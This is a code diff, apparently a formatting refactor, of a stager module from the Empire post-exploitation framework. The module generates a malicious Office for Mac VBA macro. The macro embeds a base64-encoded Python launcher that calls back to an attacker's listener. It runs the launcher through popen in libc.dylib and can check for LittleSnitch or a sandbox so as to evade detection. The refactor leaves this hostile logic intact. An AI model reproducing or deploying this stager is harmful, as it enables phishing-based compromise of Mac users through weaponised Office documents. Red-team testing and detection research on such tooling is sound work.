@@ -5,6 +5,7 @@ from builtins import object
 from empire.server.common import helpers
 import re
 
+
 class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
@@ -14,7 +15,7 @@ class Stager(object):
 
             'Author': ['@harmj0y', '@dchrastil', '@import-au'],
 
-            'Description': ('An OSX office macro that supports newer versions of Office.'),
+            'Description': 'An OSX office macro that supports newer versions of Office.',
 
             'Comments': [
                 "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
@@ -25,37 +26,41 @@ class Stager(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate stager for.',
+                'Required': True,
+                'Value': ''
             },
-            'Language' : {
-                'Description'   :   'Language of the stager to generate.',
-                'Required'      :   True,
-                'Value'         :   'python'
+            'Language': {
+                'Description': 'Language of the stager to generate.',
+                'Required': True,
+                'Value': 'python',
+                'SuggestedValues': ['python'],
+                'Strict': True
             },
-            'OutFile' : {
-                'Description'   :   'File to output AppleScript to, otherwise displayed on the screen.',
-                'Required'      :   False,
-                'Value'         :   ''
+            'OutFile': {
+                'Description': 'File to output AppleScript to, otherwise displayed on the screen.',
+                'Required': False,
+                'Value': ''
             },
-            'SafeChecks' : {
-                'Description'    :  'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
-                'Required'       :  True,
-                'Value'          :  'True',
-                'SuggestedValues':  ['True', 'False'],
-                'Strict'         :  True
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True',
+                'SuggestedValues': ['True', 'False'],
+                'Strict': True
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Version' : {
-                'Description'   :   'Version of Office for Mac. Accepts values "old" and "new". Old applies to versions of Office for Mac older than 15.26. New applies to versions of Office for Mac 15.26 and newer. Defaults to new.',
-                'Required'      :   True,
-                'Value'         :   'new'
+            'Version': {
+                'Description': 'Version of Office for Mac. Accepts values "old" and "new". Old applies to versions of Office for Mac older than 15.26. New applies to versions of Office for Mac 15.26 and newer. Defaults to new.',
+                'Required': True,
+                'Value': 'new',
+                'SuggestedValues': ['new', 'old'],
+                'Strict': True
             }
         }
 
@@ -69,7 +74,6 @@ class Stager(object):
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self):
         def formStr(varstr, instr):
             holder = []
@@ -77,26 +81,27 @@ class Stager(object):
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"'
             for i in range(54, len(instr), 48):
-                holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+                holder.append('\t\t' + varstr + ' = ' + varstr + ' + "' + instr[i:i + 48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
-            str1 = str1 + "\r\n"+str2
+            str1 = str1 + "\r\n" + str2
             return str1
 
         # extract all of our options
         language = self.options['Language']['Value']
-        listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        safeChecks = self.options['SafeChecks']['Value']
+        listener_name = self.options['Listener']['Value']
+        user_agent = self.options['UserAgent']['Value']
+        safe_checks = self.options['SafeChecks']['Value']
         version = self.options['Version']['Value']
-        
+
         try:
             version = str(version).lower()
         except TypeError:
             raise TypeError('Invalid version provided. Accepts "new" and "old"')
 
         # generate the python launcher code
-        pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        pylauncher = self.mainMenu.stagers.generate_launcher(listener_name, language="python", encode=True,
+                                                             userAgent=user_agent, safeChecks=safe_checks)
 
         if pylauncher == "":
             print(helpers.color("[!] Error in python launcher command generation."))
@@ -134,7 +139,7 @@ class Stager(object):
                             'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                             result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                     #End If
-        End Function""" %(payload)
+        End Function""" % (payload)
             elif version == "new":
                 macro = """
         Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
